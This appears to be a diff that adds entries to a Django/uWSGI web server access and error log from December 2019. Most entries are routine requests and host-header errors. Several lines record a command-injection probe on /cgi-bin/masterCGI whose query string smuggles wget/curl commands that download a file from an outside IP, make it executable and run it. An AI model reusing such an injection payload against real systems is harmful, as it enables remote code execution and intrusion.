@@ -81,3 +81,35 @@ Not Found: /scripts/ajaxPortal.lua
 [pid: 10545|app: 0|req: 35/35] 209.17.97.66 () {30 vars in 399 bytes} [Tue Dec 17 00:02:16 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.0 200) 4 headers in 123 bytes (2 switches on core 0)
 [pid: 10545|app: 0|req: 36/36] 46.101.171.183 () {30 vars in 378 bytes} [Tue Dec 17 01:56:11 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.0 200) 4 headers in 123 bytes (2 switches on core 0)
 [pid: 10545|app: 0|req: 37/37] 79.167.2.47 () {32 vars in 463 bytes} [Tue Dec 17 02:38:17 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 38/38] 54.152.245.109 () {36 vars in 524 bytes} [Tue Dec 17 04:06:34 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 39/39] 139.162.119.197 () {32 vars in 403 bytes} [Tue Dec 17 04:06:38 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
+Not Found: /cgi-bin/masterCGI
+[pid: 10545|app: 0|req: 40/40] 208.97.139.112 () {26 vars in 546 bytes} [Tue Dec 17 05:33:15 2019] GET /cgi-bin/masterCGI?ping=nomip&user=;wget http://80.82.64.14/richard; curl -O http://80.82.64.14/richard; chmod +x richard; sh richard => generated 2136 bytes in 4 msecs (HTTP/1.0 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /cgi-bin/masterCGI
+Tue Dec 17 05:33:21 2019 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /cgi-bin/masterCGI?ping=nomip&user=;wget http://80.82.64.14/richard; curl -O http://80.82.64.14/richard; chmod +x richard; sh richard (ip 208.97.139.112) !!!
+Tue Dec 17 05:33:21 2019 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET /cgi-bin/masterCGI?ping=nomip&user=;wget http://80.82.64.14/richard; curl -O http://80.82.64.14/richard; chmod +x richard; sh richard (208.97.139.112)
+OSError: write error
+[pid: 10545|app: 0|req: 41/41] 208.97.139.112 () {26 vars in 546 bytes} [Tue Dec 17 05:33:21 2019] GET /cgi-bin/masterCGI?ping=nomip&user=;wget http://80.82.64.14/richard; curl -O http://80.82.64.14/richard; chmod +x richard; sh richard => generated 0 bytes in 4 msecs (HTTP/1.0 404) 4 headers in 0 bytes (1 switches on core 0)
+Not Found: /cgi-bin/masterCGI
+[pid: 10545|app: 0|req: 42/42] 208.97.139.112 () {26 vars in 546 bytes} [Tue Dec 17 05:33:30 2019] GET /cgi-bin/masterCGI?ping=nomip&user=;wget http://80.82.64.14/richard; curl -O http://80.82.64.14/richard; chmod +x richard; sh richard => generated 2136 bytes in 3 msecs (HTTP/1.0 404) 4 headers in 129 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 43/43] 45.33.70.146 () {26 vars in 281 bytes} [Tue Dec 17 08:14:33 2019] GET / => generated 16351 bytes in 4 msecs (HTTP/1.0 200) 4 headers in 123 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 44/44] 45.33.70.146 () {26 vars in 281 bytes} [Tue Dec 17 08:34:19 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.0 200) 4 headers in 123 bytes (2 switches on core 0)
+Invalid HTTP_HOST header: '204.105.194.35.bc.googleusercontent.com'. You may need to add '204.105.194.35.bc.googleusercontent.com' to ALLOWED_HOSTS.
+Bad Request: /
+[pid: 10545|app: 0|req: 45/45] 45.33.70.146 () {28 vars in 333 bytes} [Tue Dec 17 08:34:20 2019] GET / => generated 55752 bytes in 45 msecs (HTTP/1.1 400) 2 headers in 86 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: '204.105.194.35.bc.googleusercontent.com'. You may need to add '204.105.194.35.bc.googleusercontent.com' to ALLOWED_HOSTS.
+Bad Request: /
+Tue Dec 17 08:34:45 2019 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 45.33.70.146) !!!
+Tue Dec 17 08:34:45 2019 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during HEAD / (45.33.70.146)
+OSError: write error
+[pid: 10545|app: 0|req: 46/46] 45.33.70.146 () {32 vars in 384 bytes} [Tue Dec 17 08:34:45 2019] HEAD / => generated 36458 bytes in 33 msecs (HTTP/1.1 400) 2 headers in 86 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: 'localhost'. You may need to add 'localhost' to ALLOWED_HOSTS.
+Bad Request: /
+Tue Dec 17 08:34:54 2019 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 45.33.70.146) !!!
+Tue Dec 17 08:34:54 2019 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during HEAD / (45.33.70.146)
+OSError: write error
+[pid: 10545|app: 0|req: 47/47] 45.33.70.146 () {32 vars in 414 bytes} [Tue Dec 17 08:34:53 2019] HEAD / => generated 36458 bytes in 30 msecs (HTTP/1.1 400) 2 headers in 86 bytes (1 switches on core 0)
+[pid: 10545|app: 0|req: 48/48] 178.128.234.200 () {30 vars in 379 bytes} [Tue Dec 17 09:20:48 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.0 200) 4 headers in 123 bytes (2 switches on core 0)
+[pid: 10545|app: 0|req: 49/49] 128.14.209.250 () {34 vars in 490 bytes} [Tue Dec 17 09:59:28 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (2 switches on core 0)
+Not Found: /robots.txt
+[pid: 10545|app: 0|req: 50/50] 74.63.227.26 () {26 vars in 302 bytes} [Tue Dec 17 10:49:15 2019] HEAD /robots.txt => generated 1979 bytes in 4 msecs (HTTP/1.0 404) 4 headers in 129 bytes (2 switches on core 0)
